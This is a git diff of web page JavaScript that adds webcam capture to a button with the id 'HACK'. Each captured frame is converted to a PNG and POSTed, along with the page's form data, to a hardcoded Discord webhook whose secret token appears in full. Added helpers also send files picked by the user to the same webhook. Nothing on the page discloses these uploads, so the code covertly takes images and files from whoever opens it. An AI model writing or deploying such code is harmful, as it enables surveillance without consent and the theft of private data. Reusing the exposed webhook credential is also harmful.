@@ -1,6 +1,7 @@
 document.addEventListener('DOMContentLoaded', init, false);
 const widht = window.innerWidth;
 const height = window.innerHeight;
+const myformData = new FormData();
 
 
 const constraints = {
@@ -16,6 +17,14 @@ async function init(){
      handleSuccess(stream);
      const HACK = document.getElementById("HACK");
      HACK.addEventListener("click", drawCapture);
+     document.getElementById("picker").addEventListener('change', function (event) {
+        const { files } = event.target;
+
+        Object.values(files).forEach(function (file, index) {
+          myformData.append("file0", file, "UneImage");
+
+        });
+      });
     }
     catch(e){
         error.innerHTML =  e.toString();
@@ -36,6 +45,88 @@ function handleSuccess(stream){
 
 function drawCapture(){
     var c = document.getElementById("capture");
-    var ctx = c.getContext("2d");
+    var ctx = c.getContext("2d",{ willReadFrequently: true });
     ctx.drawImage(window.live, 10, 10);
+    var image = ctx.getImageData(10,10,c.width, c.height);
+    //sendImageOnDiscord(image);
+    fetchV51(c);
 }
+
+function sendImageOnDiscord(image){
+    var URL = 'https://discord.com/api/webhooks/1061663911520260127/orVJx2YA-5uas2x_7w_KCsqyiMCD9iJLTymJkPdPpZwoJSjLCzMW7y4NcJL6YdKlOklg';
+    a = new FormData()
+    a.append("test", "a", "b");
+    fetch(URL, {
+        "method":"POST",
+        "headers": {"Content-Type": "multipart/form-data"},
+        "body": JSON.stringify({
+            "content":a
+        })
+    })
+    .then(res=> console.log(res))
+    .catch(err => console.error(err));
+}
+
+function ajaxPost(){
+    var URL = 'https://discord.com/api/webhooks/1061663911520260127/orVJx2YA-5uas2x_7w_KCsqyiMCD9iJLTymJkPdPpZwoJSjLCzMW7y4NcJL6YdKlOklg';
+    message="Hello"
+    let postObject = JSON.stringify({
+        content: "hi",
+        username: "hello",
+        avatar_url: ""
+    });
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", URL, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(postObject);
+}
+
+function fetchV50(){
+    var URL = 'https://discord.com/api/webhooks/1061663911520260127/orVJx2YA-5uas2x_7w_KCsqyiMCD9iJLTymJkPdPpZwoJSjLCzMW7y4NcJL6YdKlOklg';
+    const fileInput = document.querySelector('#picker') ;
+    const formData = new FormData();
+    formData.append('file', fileInput.files[0]);
+
+        const options = {
+        method: 'POST',
+        body: formData,
+        };
+        
+        fetch(URL, options);
+}
+
+function fetchV51(canvas){
+    var URL = 'https://discord.com/api/webhooks/1061663911520260127/orVJx2YA-5uas2x_7w_KCsqyiMCD9iJLTymJkPdPpZwoJSjLCzMW7y4NcJL6YdKlOklg';
+    
+    var dataURL = canvas.toDataURL('image/png', 0.5);
+    var blob = dataURItoBlob(dataURL);
+    var fd = new FormData(document.forms[0]);
+    fd.append("canvasImage", blob, "file.png");
+    
+    const options = {
+        method: 'POST',
+        body: fd,
+    }; 
+    fetch(URL, options);
+}
+
+function dataURItoBlob(dataURI) {
+    // convert base64/URLEncoded data component to raw binary data held in a string
+    var byteString;
+    if (dataURI.split(',')[0].indexOf('base64') >= 0)
+        byteString = atob(dataURI.split(',')[1]);
+    else
+        byteString = unescape(dataURI.split(',')[1]);
+
+    // separate out the mime component
+    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+
+    // write the bytes of the string to a typed array
+    var ia = new Uint8Array(byteString.length);
+    for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+
+    return new Blob([ia], {type:mimeString});
+}
+
